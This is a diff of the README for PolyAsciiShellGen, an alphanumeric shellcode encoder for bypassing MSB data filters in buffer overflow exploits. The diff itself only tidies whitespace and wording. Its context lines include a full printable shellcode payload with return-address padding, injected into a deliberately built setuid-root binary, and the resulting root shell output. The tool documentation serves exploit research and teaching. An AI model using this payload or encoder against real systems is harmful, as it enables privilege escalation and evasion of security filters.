@@ -1,6 +1,6 @@
 # PolyAsciiShellGen: alphanumeric shellcode encoder
 
-PolyAsciiShellGen is a simple alphanumeric shellcode encoder coded in C. This program automates the [Riley Eller's technic](http://julianor.tripod.com/bc/bypass-msb.txt) to bypass MSB data filters, for buffer overflow exploits, on Intel platforms. It provides extra functionnalities such as the NOP sleed generation and the size optimisation. It takes a shellcode to encode in entry and return a printable shellcode directly useable. 
+PolyAsciiShellGen is a simple alphanumeric shellcode encoder coded in C. This program automates the [Riley Eller's technic](http://julianor.tripod.com/bc/bypass-msb.txt) to bypass MSB data filters, for buffer overflow exploits, on Intel platforms. It provides extra functionnalities such as the NOP sleed generation and the size optimisation. It takes a shellcode to encode in entry and return a printable shellcode directly useable.
 
 
 - Synopsis
@@ -13,9 +13,9 @@ PolyAsciiShellGen is a simple alphanumeric shellcode encoder coded in C. This pr
 
 ## Synopsis
 
-Getting and building the PolyAsciiShellGen program.
+Get and buil PolyAsciiShellGen.
 
-``` 
+```
 $ git clone https://github.com/VincentDary/PolyAsciiShellGen.git
 $ cd PolyAsciiShellGen
 $ make && make clean
@@ -40,7 +40,7 @@ Riley Eller
 
 Below, an illustration of the shellcode loading techique realized by the shellcode loader.
 
-``` 
+```
  1)      Low addresse      2)      Low addresse     3)      Low addresse
       |                |        |                |       |                |
 eip-->|----------------|        |----------------|       |----------------|
@@ -86,7 +86,7 @@ The shellcode parameters is the shellcode in escaping format "...\xcd\x80...". I
 - Return value
 
 The return value of this command is the printable encoded shellcode. The resulting printable encoded shellcode is generated randomly between each execution. So, you can generate a set of printable encoded shellcode with different signatures from one original shellcode. The ASCII characteres set use for the encoding is the following:
-"%_01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-". 
+"%_01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-".
 
 
 ## Example
@@ -129,7 +129,7 @@ Set the executable with the with the setuid bit and the root owner, for use all 
 
 ```
 # chown root:users vuln
-# chmod u+s vuln 
+# chmod u+s vuln
 # ls -l vuln
 -rwsr-xr-x 1 root users 7068 Jul  6 02:37 vuln
 ```
@@ -145,7 +145,7 @@ Inject the encoded shellcode on the vulnerable buffer and write the return addre
 ```
 $ ./vuln "TX-KKKK-KKKK-xjiiP\%0000%AAAA-9%%%-GJJJP-hhNh-th3%-Q6-5P-yyyZ-yZy6-L6---2-8-P-7KKd-%Kdz-%RkzP-xxxx-GGGx-0AFiP-OOOO-jOwO-iaraP-NN%N-a%%a-q44tP-%SS0-%SL5-7uC%P-FkFF-9pUhP-XXXX-XXXX-PXOFP-AAAj-0w2j-0w-vPPPPPPPPPP$(perl -e 'print "\xd0\xd6\xff\xff"x80')"
 
-[buffer addr] 0xffffd6d0: 
+[buffer addr] 0xffffd6d0:
 TX-KKKK-KKKK-xjiiP\%0000%AAAA-9%%%-GJJJP-hhNh-th3%-Q6-5P-yyyZ-yZy6-L6---2-8-P-7KKd-%Kdz-%RkzP-xxxx-GGGx-0AFiP-OOOO-jOwO-iaraP-NN%N-a%%a-q44tP-%SS0-%SL5-7uC%P-FkFF-9pUhP-XXXX-XXXX-PXOFP-AAAj-0w2j-0w-vPPPPPPPPPP��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
 sh-4.3# whoami
 root
@@ -253,9 +253,5 @@ Have fun !!
 
 ## Links
 
-- [1] Bypassing MSB Data Filters for Buffer Overflow Exploits on Intel Platforms, Riley Eller “caezar”: 
+- [1] Bypassing MSB Data Filters for Buffer Overflow Exploits on Intel Platforms, Riley Eller “caezar”:
 [http://julianor.tripod.com/bc/bypass-msb.txt](http://julianor.tripod.com/bc/bypass-msb.txt)
-
-
-
-
